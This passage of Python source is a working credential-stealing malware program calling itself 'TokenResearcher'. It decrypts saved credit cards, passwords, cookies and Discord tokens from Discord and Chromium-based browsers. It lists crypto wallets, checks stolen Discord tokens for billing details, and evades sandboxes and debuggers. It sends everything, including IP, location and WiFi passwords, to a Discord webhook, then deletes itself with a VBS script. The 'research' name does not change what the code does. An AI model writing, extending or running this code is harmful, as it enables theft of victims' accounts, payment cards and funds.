        reverse_digits = digits[::-1]
        for i, n in enumerate(reverse_digits):
            if i % 2 == 1:
                n *= 2
                if n > 9:
                    n -= 9
            total += n
        return total % 10 == 0

    @staticmethod
    def _is_valid_card_format(dec_num: str) -> bool:
        cleaned = re.sub(r'[\s-]', '', dec_num)
        if not (13 <= len(cleaned) <= 19 and cleaned.isdigit()):
            return False
        return TokenResearcher._luhn_check(cleaned)

    def extract_credit_cards(self, base_path: str, m_key: bytes):
        """Extract saved credit cards from Chrome Web Data / Autofill."""
        for sub in ['Web Data', 'Sync Data']:
            webdata_path = os.path.join(base_path, sub)
            if not os.path.exists(webdata_path):
                continue
            tmp = self._temp_path('cc')
            if not self._safe_copy(webdata_path, tmp):
                continue
            try:
                conn = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
                )
                for name, exp_m, exp_y, enc_num in cursor.fetchall():
                    dec_num = self.decrypt_payload(enc_num, m_key)
                    if dec_num and self._is_valid_card_format(dec_num):
                        masked = dec_num[:4] + "****" + dec_num[-4:]
                        self.all_credit_cards.add(f"Name: {name} | Card: {masked} ({dec_num}) | Exp: {exp_m}/{exp_y}")
                conn.close()
            except Exception:
                pass
            finally:
                self._safe_delete(tmp)

    def extract_wallets(self):
        """Detect crypto wallet extensions and local wallet files."""
        wallet_paths = {
            'MetaMask': [os.path.join(self.appdata, 'MetaMask'), os.path.join(self.local, 'MetaMask')],
            'Coinbase Wallet': [os.path.join(self.local, 'CoinbaseWallet')],
            'Phantom': [os.path.join(self.local, 'Phantom')],
            'Exodus': [os.path.join(self.appdata, 'Exodus')],
            'Electrum': [os.path.join(self.appdata, 'Electrum')],
            'Atomic Wallet': [os.path.join(self.appdata, 'atomic')],
            'Trust Wallet': [os.path.join(self.local, 'TrustWallet')],
            'Binance Wallet': [os.path.join(self.local, 'BinanceWallet')],
            'Ledger Live': [os.path.join(self.appdata, 'Ledger Live')],
            'Trezor Suite': [os.path.join(self.appdata, '@trezor')],
            'Keplr': [os.path.join(self.local, 'KeplrExtension')],
            'Rainbow': [os.path.join(self.appdata, 'Rainbow')],
            'Zapper': [os.path.join(self.local, 'Zapper')],
            'Zerion': [os.path.join(self.local, 'Zerion')]
        }
        for name, paths in wallet_paths.items():
            for path in paths:
                if os.path.exists(path):
                    size = 0
                    try:
                        for root, dirs, files in os.walk(path):
                            for f in files:
                                size += os.path.getsize(os.path.join(root, f))
                        self.all_wallets.add(f"{name} ({size} bytes)")
                    except Exception:
                        self.all_wallets.add(name)

    def check_nitro_status(self, token: str) -> dict:
        """
        Check if a Discord token has Nitro subscription & billing info.
        FIXED: Rate limiting, retry on 429, proper billing/subscription handling.
        """
        headers = {
            'Authorization': token,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-Discord-Locale': 'en-US',
            'X-Discord-Timezone': 'America/New_York'
        }
        nitro_info = "None"
        billing_info = "None"
        username = "Unknown"

        with self._api_semaphore:
            if not requests:
                return {'username': username, 'nitro': nitro_info, 'billing': billing_info}

            try:
                # 1. Fetch User profile
                r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
                if r.status_code == 429:
                    retry_after = r.json().get('retry_after', 1)
                    time.sleep(retry_after)
                    r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)

                if r.status_code == 200:
                    data = r.json()
                    username = f"{data.get('username')}#{data.get('discriminator', '0')}"
                    premium_type = data.get('premium_type', 0)
                    if premium_type == 1:
                        nitro_info = "Nitro Classic"
                    elif premium_type == 2:
                        nitro_info = "Nitro Boost"
                    elif premium_type == 3:
                        nitro_info = "Nitro Basic"

                    # 2. Fetch Subscriptions
                    r2 = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=10)
                    if r2.status_code == 200:
                        subs = r2.json()
                        if subs:
                            nitro_info += f" ({len(subs)} active sub(s))"

                    # 3. Fetch Payment sources
                    r3 = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers, timeout=10)
                    if r3.status_code == 200:
                        payments = r3.json()
                        billing_types = []
                        for p in payments:
                            ptype = p.get('type')
                            brand = p.get('brand')
                            last4 = p.get('last_4')
                            email = p.get('email')
                            if ptype == 1:
                                billing_types.append(f"Card ({brand} ending in {last4})")
                            elif ptype == 2:
                                billing_types.append(f"PayPal ({email})")
                        if billing_types:
                            billing_info = ', '.join(billing_types)
                elif r.status_code == 401:
                    nitro_info = "Invalid (401 Unauthorized)"
                elif r.status_code == 403:
                    nitro_info = "Locked (403 Forbidden)"
            except Exception as e:
                log(f"check_nitro_status error: {e}")

        return {'username': username, 'nitro': nitro_info, 'billing': billing_info}

    def extract_data(self, name: str, base_path: str):
        """Worker thread to extract tokens, cookies, passwords, webhooks from a target."""
        try:
            ls_path = os.path.join(base_path, 'Local State')
            m_key = self.get_master_key(ls_path)

            # LevelDB Tokens & Webhooks
            self.extract_tokens_leveldb(base_path, m_key)
            self.extract_discord_webhooks(base_path)

            # Browser Profiles (Cookies, Passwords, Credit Cards)
            for profile in self.get_profiles(base_path):
                prof_path = os.path.join(base_path, profile) if profile else base_path
                self.extract_cookies(name, prof_path, m_key)
                self.extract_passwords(prof_path, m_key)
                self.extract_credit_cards(prof_path, m_key)
        except Exception as e:
            log(f"extract_data error on {name}: {e}")

    def check_environment(self) -> bool:
        """Run anti-detection checks."""
        detected = self._anti.run_all_checks()
        if detected:
            log(f"Sandbox / Debugger detected! Reasons: {self._anti.get_reasons()}")
        return detected

    def run(self):
        """Main execution orchestrator."""
        if self.check_environment():
            # Evade analysis: hide console, sleep, exit quietly
            try:
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except Exception:
                pass
            time.sleep(random.uniform(2.0, 8.0))
            sys.exit(0)

        # Hide console
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass

        time.sleep(random.uniform(0.5, 2.0))

        targets = {
            'Discord': os.path.join(self.appdata, 'discord'),
            'DiscordCanary': os.path.join(self.appdata, 'discordcanary'),
            'DiscordPTB': os.path.join(self.appdata, 'discordptb'),
            'DiscordDevelopment': os.path.join(self.appdata, 'discorddevelopment'),
            'Chrome': os.path.join(self.local, 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(self.local, 'Microsoft', 'Edge', 'User Data'),
            'Brave': os.path.join(self.local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'BraveNightly': os.path.join(self.local, 'BraveSoftware', 'Brave-Browser-Nightly', 'User Data'),
            'Opera': os.path.join(self.appdata, 'Opera Software', 'Opera Stable'),
            'OperaGX': os.path.join(self.appdata, 'Opera Software', 'Opera GX Stable'),
            'Vivaldi': os.path.join(self.local, 'Vivaldi', 'User Data'),
            'Yandex': os.path.join(self.local, 'Yandex', 'YandexBrowser', 'User Data'),
            'Chromium': os.path.join(self.local, 'Chromium', 'User Data'),
        }

        # Multi-threaded browser extraction
        cpu_count = os.cpu_count() or 4
        max_workers = max(2, min(cpu_count * 2, 16))
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for name, path in targets.items():
                if os.path.exists(path):
                    futures.append(executor.submit(self.extract_data, name, path))
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    log(f"Error in extraction task: {e}")

        # Extract crypto wallets
        self.extract_wallets()

        # Compile and send report
        self.send_report()

        # Clean self
        self.self_destruct()

    def _safe_request(self, url: str, method: str = 'GET', **kwargs):
        """FIXED: Secure HTTP request with User-Agent and timeout defaults."""
        headers = kwargs.pop('headers', {})
        if 'User-Agent' not in headers:
            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        kwargs['headers'] = headers
        if 'timeout' not in kwargs:
            kwargs['timeout'] = 15
        if not requests:
            return None
        if method.upper() == 'GET':
            return requests.get(url, **kwargs)
        elif method.upper() == 'POST':
            return requests.post(url, **kwargs)
        raise ValueError(f"Unsupported method: {method}")

    def send_report(self):
        """Comprehensive report generation and exfiltration via webhook."""
        self._anti.sleep_evade(0.33)

        # External IP check
        ext_ip = "N/A"
        net_info = "N/A"
        try:
            r = self._safe_request('https://ipapi.co/json', timeout=5)
            if r and r.status_code == 200:
                info = r.json()
                ext_ip = info.get('ip', 'N/A')
                net_info = f"{info.get('city', 'N/A')}, {info.get('region', 'N/A')}, {info.get('country_name', 'N/A')} ({info.get('org', 'N/A')})"
        except Exception:
            try:
                r = self._safe_request('https://api.ipify.org?format=json', timeout=5)
                if r and r.status_code == 200:
                    ext_ip = r.json().get('ip', 'N/A')
            except Exception:
                pass

        sys_info = SystemInfo.get_all()
        token_count = len(self.all_tokens)
        cookie_count = len(self.all_cookies)
        password_count = len(self.all_passwords)
        cc_count = len(self.all_credit_cards)
        wallet_count = len(self.all_wallets)
        webhook_count = len(self.all_webhooks)

        embeds = []

        # 1. Summary Embed
        embed_summary = {
            "title": "🔍 System & Harvest Summary",
            "color": 0x2B2D31,
            "fields": [
                {"name": "💻 Machine Info", "value": f"**IP:** `{ext_ip}`\n**Location:** `{net_info}`\n{sys_info['text']}", "inline": False},
                {
                    "name": "📊 Statistics",
                    "value": (
                        f"**Tokens:** `{token_count}`\n"
                        f"**Cookies:** `{cookie_count}`\n"
                        f"**Passwords:** `{password_count}`\n"
                        f"**Credit Cards:** `{cc_count}`\n"
                        f"**Wallets:** `{wallet_count}`\n"
                        f"**Webhooks:** `{webhook_count}`"
                    ),
                    "inline": True
                }
            ],
            "footer": {"text": f"Stealth Level: MAX | {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"},
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

        wifi_profiles = sys_info.get('wifi', [])
        if wifi_profiles:
            wifi_text = '\n'.join(wifi_profiles[:10])
            embed_summary["fields"].append({
                "name": "📶 WiFi Networks",
                "value": f"```\n{self._truncate_bytes(wifi_text, 1024)}\n```",
                "inline": False
            })
        embeds.append(embed_summary)

        # 2. Discord Tokens Embed
        all_tokens_list = self.all_tokens.get_all()
        if all_tokens_list:
            token_lines = []
            for token in all_tokens_list[:10]:
                nitro_data = self.check_nitro_status(token)
                token_lines.append(
                    f"**User:** `{nitro_data['username']}`\n"
                    f"**Nitro:** `{nitro_data['nitro']}` | **Billing:** `{nitro_data['billing']}`\n"
                    f"**Token:** `{token}`\n"
                )
            tokens_text = '\n'.join(token_lines)
            embeds.append({
                "title": f"🔑 Discord Tokens ({token_count})",
                "color": 0x5865F2,
                "description": self._truncate_bytes(tokens_text, 4000)
            })

        # 3. Passwords Embed
        pwd_list = self.all_passwords.get_all()
        if pwd_list:
            embeds.append({
                "title": f"🔐 Saved Passwords ({password_count})",
                "color": 0xE67E22,
                "description": self._truncate_bytes('\n'.join(pwd_list[:15]), 4000)
            })

        # 4. Credit Cards Embed
        cc_list = self.all_credit_cards.get_all()
        if cc_list:
            embeds.append({
                "title": f"💳 Credit Cards ({cc_count})",
                "color": 0x2ECC71,
                "description": self._truncate_bytes('\n'.join(cc_list[:10]), 4000)
            })

        # 5. Wallets Embed
        wallets_list = self.all_wallets.get_all()
        if wallets_list:
            embeds.append({
                "title": f"🪙 Crypto Wallets ({wallet_count})",
                "color": 0xF1C40F,
                "description": self._truncate_bytes('\n'.join(wallets_list), 4000)
            })

        # 6. Webhooks Embed
        wh_list = self.all_webhooks.get_all()
        if wh_list:
            embeds.append({
                "title": f"📡 Discord Webhooks Found ({webhook_count})",
                "color": 0x9B59B6,
                "description": self._truncate_bytes('\n'.join(wh_list[:10]), 4000)
            })

        # Generate Comprehensive Text Report File
        rpt_lines = [
            f"=== COMPREHENSIVE HARVEST REPORT [{self._session_id}] ===",
            f"Timestamp: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}",
            f"IP: {ext_ip} ({net_info})",
            "",
            "=== SYSTEM INFO ===",
            sys_info['text'],
            "",
            "=== WIFI PASSWORDS ===",
            '\n'.join(wifi_profiles) if wifi_profiles else "(none)",
            "",
            f"=== DISCORD TOKENS ({token_count}) ===",
            '\n'.join(all_tokens_list) if all_tokens_list else "(none)",
            "",
            f"=== SAVED PASSWORDS ({password_count}) ===",
            '\n'.join(pwd_list) if pwd_list else "(none)",
            "",
            f"=== CREDIT CARDS ({cc_count}) ===",
            '\n'.join(cc_list) if cc_list else "(none)",
            "",
            f"=== CRYPTO WALLETS ({wallet_count}) ===",
            '\n'.join(wallets_list) if wallets_list else "(none)",
            "",
            f"=== DISCORD WEBHOOKS ({webhook_count}) ===",
            '\n'.join(wh_list) if wh_list else "(none)",
            "",
            f"=== COOKIES ({cookie_count}) ===",
            '\n'.join(self.all_cookies.get_all()) if cookie_count else "(none)",
            "",
            "=== INSTALLED PROGRAMS ===",
            '\n'.join(sys_info.get('programs', [])) if sys_info.get('programs') else "(none)"
        ]

        report_text = '\n'.join(rpt_lines)
        rpt_file = os.path.join(self.temp_dir, f"report_{self._session_id}.txt")
        self._temp_files.append(rpt_file)
        try:
            with open(rpt_file, 'w', encoding='utf-8') as f:
                f.write(report_text)
        except Exception:
            pass

        # Exfiltrate to Discord Webhook
        if requests and WEBHOOK_URL:
            try:
                # Discord allows max 10 embeds per message
                for i in range(0, len(embeds), 10):
                    chunk = embeds[i:i+10]
                    requests.post(
                        WEBHOOK_URL,
                        json={"embeds": chunk, "username": "TokenResearcher Harvest"},
                        timeout=15
                    )
                # Send report text file attachment
                if os.path.exists(rpt_file):
                    with open(rpt_file, 'rb') as f:
                        requests.post(
                            WEBHOOK_URL,
                            data={"content": f"📁 Full extraction report for `{sys_info['computer']}/{sys_info['user']}` ({ext_ip})"},
                            files={"file": (f"report_{self._session_id}.txt", f, "text/plain")},
                            timeout=30
                        )
            except Exception as e:
                log(f"Failed to post to webhook: {e}")

    def self_destruct(self):
        """Self-destruct via asynchronous VBS script with delay."""
        if _DEBUG:
            log("Debug mode enabled: skipping self_destruct.")
            return

        try:
            file_path = os.path.abspath(getattr(sys, 'frozen', False) and sys.executable or sys.argv[0])
            vbs_path = os.path.join(self.temp_dir, f"cleanup_{self._session_id}.vbs")
            vbs_code = (
                f'CreateObject("WScript.Shell").Run '
                f'"timeout /t 5 /nobreak >nul & del /f /q ""{file_path}"" & del /f /q ""{vbs_path}""", 0, False'
            )
            with open(vbs_path, 'w') as f:
                f.write(vbs_code)
            subprocess.Popen(['wscript.exe', vbs_path], shell=False)
        except Exception as e:
            log(f"self_destruct error: {e}")
        finally:
            os._exit(0)


if __name__ == '__main__':
    # Auto-install missing requirements if running standalone
    _auto_install()

    researcher = TokenResearcher()
    researcher.run()
